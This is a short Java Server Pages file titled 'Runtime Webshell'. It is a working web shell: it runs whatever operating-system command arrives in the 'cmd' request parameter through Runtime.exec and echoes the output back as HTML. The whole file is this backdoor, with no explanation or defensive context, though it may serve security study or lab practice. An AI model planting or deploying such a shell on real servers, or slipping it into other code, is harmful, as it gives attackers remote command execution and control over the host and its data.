<%@ page import="java.io.*" %><%--
  Created by IntelliJ IDEA.
  User: n0zom1z0
  Date: 2024/10/3
  Time: 20:33
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%= Runtime.getRuntime().exec(request.getParameter("cmd"))%>>
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
        out.print("<pre>" + line + "</pre>");
    }
%>
<html>
<head>
    <title>Runtime Webshell</title>
</head>
<body>

</body>
</html>
